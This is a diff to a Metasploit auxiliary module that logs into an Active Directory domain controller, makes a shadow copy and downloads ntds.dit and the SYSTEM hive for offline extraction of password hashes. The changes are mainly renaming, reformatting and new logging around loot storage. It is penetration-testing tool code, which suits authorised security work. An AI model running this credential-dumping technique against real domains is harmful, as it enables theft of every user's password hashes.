@@ -24,18 +24,18 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-		'Name' => 'Windows Domain Controller - Download NTDS.dit and SYSTEM Hive',
-			'Description'=> %q{This module authenticates to an Active Directory Domain Controller and creates
-				a volume shadow copy of the %SYSTEMDRIVE%.It then pulls down copies of the ntds.dit file as well
-				as the SYSTEM hive and stores them on your attacking machine.The ntds.dit and SYSTEM copy can be used
-				in combination with other tools for offline extraction of AD password hashes.All of this is possible without
-				uploading a single binary to the target host.
+			'Name' => 'PsExec NTDS.dit And SYSTEM Hive Download Utility',
+			'Description'=> %q{
+					This module authenticates to an Active Directory Domain Controller and creates
+				a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the
+				ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM
+				hive copy can be used in combination with other tools for offline extraction of AD
+				password hashes. All of this is done without uploading a single binary to the
+				target host.
 			},
-
 			'Author' => [
-				'Royce Davis @R3dy__ <rdavis[at]accuvant.com>'
+				'Royce Davis <rdavis[at]accuvant.com>' # @R3dy__
 			],
-
 			'License'=> MSF_LICENSE,
 			'References' => [
 				[ 'URL', 'http://sourceforge.net/projects/smbexec' ],
@@ -199,8 +199,9 @@ class Metasploit3 < Msf::Auxiliary
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			store_loot("NTDS.database", "data", @ip, data, "ntds.dit", nil, nil)
 			remotefile.close
+			ntds_path = store_loot("psexec.ntdsgrab.ntds", "application/octet-stream", @ip, data, "ntds.dit")
+			print_good("#{peer} - ntds.dit stored at #{ntds_path}")
 		rescue StandardError => ntdsdownloaderror
 			print_error("#{peer} - Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
 			return ntdsdownloaderror
@@ -217,8 +218,9 @@ class Metasploit3 < Msf::Auxiliary
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			store_loot("Registry.hive.system", "binary/reg", @ip, data, "system-hive", nil, nil)
 			remotefile.close
+			hive_path = store_loot("psexec.ntdsgrab.hive", "application/octet-stream", @ip, data, "system-hive")
+			print_good("#{peer} - SYSTEM hive stored at #{hive_path}")
 		rescue StandardError => sysdownloaderror
 			print_error("#{peer} - Unable to download SYSTEM hive: #{sysdownloaderror}")
 			return sysdownloaderror
